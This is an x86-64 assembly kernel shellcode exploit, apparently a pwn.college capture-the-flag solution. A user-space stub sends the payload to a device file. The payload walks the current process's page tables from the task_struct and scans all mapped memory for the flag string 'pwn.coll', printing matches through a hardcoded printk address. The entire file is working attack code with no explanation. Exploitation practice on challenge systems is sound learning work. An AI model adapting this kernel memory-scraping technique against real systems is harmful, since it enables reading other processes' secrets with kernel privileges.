mov eax, 1
mov rdi, 3
lea rsi, [rip+kernel]
mov rdx, 2048
syscall
loop:
nop
jmp loop

kernel:
jmp begin

decode_ptr:
	push rdx
	mov rax, rdi
	movabs rdx, 0x00000000fffff000
	and rax, rdx
	movabs rdx, 0xffff888000000000
	add rax, rdx
	pop rdx
	ret

is_huge_page:
	push rdx
	xor edx, edx
	xor eax, eax
	mov dl, 1
	shl rdx, 7
	test rdi, rdx
	jnz huge_page_true
	jmp is_huge_page_cleanup
huge_page_true:
	inc al
is_huge_page_cleanup:
	pop rdx
	ret


search:
	push rcx
	push rdx
	push rbx
	push r10
	xor ecx, ecx
	mov rdx, [rip + flag_part]
	sub rsi, 8
	
search_loop:
	mov rbx, [rdi + rcx]
	cmp rbx, rdx
	je search_found_flag

search_increase:
	inc rcx
	cmp rcx, rsi
	jl search_loop
	jmp search_cleanup	

search_found_flag:

	mov r10, rdi
	lea rdi, [rdi + rcx]
	// send to printk
	push rax
	push r8
	push rdx
	push r11
	mov rax, 0xffffffff810b6309
	call rax
	pop r11
	pop rdx
	pop r8
	pop rax
	mov rdi, r10
	jmp search_increase

search_cleanup:
	pop r10
	pop rbx
	pop rdx
	pop rcx
	ret

begin:
// get task struct
mov rax, gs:[0x15d00]
// get mem struct
mov rax, [rax + 0x3e0]
// get virtual pdg
mov r8, [rax + 0x50]
// set the memory paging base
xor r10, r10
xor r11, r11
xor r12, r12
push r12

// get the first level of paging
get_page_global_directory:
mov rdx, [r8 + 8*r10]
inc r10
cmp r10, 512 
jge finish
test rdx, rdx
jz get_page_global_directory

mov rdi, rdx
call decode_ptr
mov rdx, rax

// set the index to 0
// get the second level of paging
xor r11, r11
get_page_upper_directory:
mov rbx, [rdx + 8*r11]
inc r11
cmp r11, 512 
je get_page_global_directory
test rbx, rbx
jz get_page_upper_directory

mov rdi, rbx
call is_huge_page
test rax, rax
jnz search_upper_medium
jmp search_in_page_medium

search_upper_medium:
mov rdi, rbx
call decode_ptr
mov rbx, rax
mov rdi, rbx
mov rsi, 0x40000000
call search
jmp get_page_upper_directory

search_in_page_medium:
// get the decode ptr
mov rdi, rbx
call decode_ptr
mov rbx, rax

xor r12, r12
// get the third level of paging
get_page_medium_directory:
mov rdi, [rbx + 8*r12]
inc r12
cmp r12, 512
je get_page_upper_directory
test rdi, rdi
jz get_page_medium_directory

call is_huge_page
test rax, rax
jnz search_page_medium
jmp in_page_table

search_page_medium:
call decode_ptr
mov rdi, rax
mov rsi, 0x200000
call search
jmp get_page_medium_directory

in_page_table:
call decode_ptr
mov rdi, rax

xor r13, r13
// get the actual page
get_page_table:
mov rsi, [rdi + 8*r13]
inc r13
cmp r13, 512
je get_page_medium_directory
test rsi, rsi
jz get_page_table

push rdi
mov rdi, rsi 
call decode_ptr
mov rsi, rax
pop rdi

push rdi
push rsi
mov rdi, rsi
mov rsi, 4096
call search
pop rsi
pop rdi

jmp get_page_table


finish:
ret

flag_part:
	.string "pwn.coll"
